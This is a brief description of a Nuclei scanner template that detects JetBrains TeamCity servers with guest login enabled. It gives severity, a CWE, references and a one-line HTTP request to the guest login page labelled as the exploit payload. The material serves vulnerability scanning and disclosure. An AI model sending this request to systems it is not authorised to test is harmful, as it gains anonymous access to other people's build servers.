# Nuclei Template: JetBrains TeamCity - Guest User Access Enabled
**Template ID:** teamcity-guest-login-enabled
**Vulnerability Class:** Information Disclosure
**Severity:** High
**CWE:** CWE-200
**Source:** Nuclei Template (`teamcity-guest-login-enabled.yaml`)

## Vulnerability Information & PoC

## Description
TeamCity provides the ability to turn on the guest login allowing anonymous access to the TeamCity UI.

## Steps to reproduce / Exploit Payload
```http
GET /guestLogin.html?guest=1 HTTP/1.1
Host: {{Hostname}}
```

## References
- https://ph33r.medium.com/misconfig-in-teamcity-panel-lead-to-auth-bypass-in-apache-org-exploit-146f6a1a4e2b
- https://www.jetbrains.com/help/teamcity/guest-user.html
